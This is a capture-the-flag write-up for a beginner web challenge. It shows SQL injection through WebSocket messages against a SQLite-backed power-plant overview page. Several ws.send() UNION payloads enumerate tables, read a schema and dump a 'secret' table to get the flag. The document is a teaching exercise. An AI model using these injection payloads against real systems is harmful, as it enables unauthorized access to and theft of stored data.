# Nucular Power Plant

## baby-web - Points: 105

> We found this overview page of nucular power plants, maybe you can get us some secret data to fight them?
>
> http://31.22.123.49:1909

When inspecting the source code of the website, you will quickly stumble over the `main.js` and some communication via a `WebSocket`. It receives `JSON` messages in different types. It will at first receive an `Array` and call the `plantList`, that contains all the power plants that are visible in the list. As soon as you select a power plant, it will receive data for `plantDetails`, the information shown in the center and then continuously receive data of type `number`, some random values, to update the current power supply state.

To reveal the data in `Chromium`, open the `DevTools` (F12), goto the `Sources` tab and open the `main.js` and add `console.log(data);` right after the parsing of the message.

The interesting part is, how the selection of a plant is handled: When you select a plant, it sends the name of it over the socket. If you probe for `SQLi`, for example by modifying `ws.send('" foo');`, it returns the string

	Error: SqliteFailure(Error { code: Unknown, extended_code: 1 }, Some("near \"foo\": syntax error"))

So it is `SQLite` database and it is vulnerable! :)

With `ws.send('" OR "1"="1" LIMIT 1 OFFSET 1;');` where you are free to change the `offset` you can force to load specific data, but there seems to be nothing more interesting in the table.

Lets try to enumerate all the tables of the database, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) has some useful queries for this:

	SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

But we have to make it compatible for our query, we can do a `UNION` and add some dummy data to keep the structure of the initial `SELECT` that we can not change. The following query will now print the table name as the plant name:

	ws.send('" UNION SELECT tbl_name, "foo", 0, 0, "foo", 0 FROM sqlite_master WHERE type="table" and tbl_name NOT like "sqlite_%";');

And we get as a result `nucular_plant` as table name. Are there more tables?

	ws.send('" UNION SELECT tbl_name, "foo", 0, 0, "foo", 0 FROM sqlite_master WHERE type="table" and tbl_name NOT like "sqlite_%" LIMIT 1 OFFSET 1;');

Oh, there is also another table named `secret`! :)

Lets try to enumerate the column names:

	ws.send('" UNION SELECT sql, "foo", 0, 0, "foo", 0 FROM sqlite_master WHERE type!="meta" AND sql NOT NULL AND name NOT LIKE "sqlite_%" AND name ="secret";');    

And we get as result the structure of the table:

	CREATE TABLE secret (id INTEGER PRIMARY KEY,name TEXT NOT NULL,value TEXT NOT NULL)

Lets read it out:

	ws.send('" UNION SELECT name, value, id, 0, "foo", 0 FROM secret;');

flag: `flag{sqli_as_a_socket}`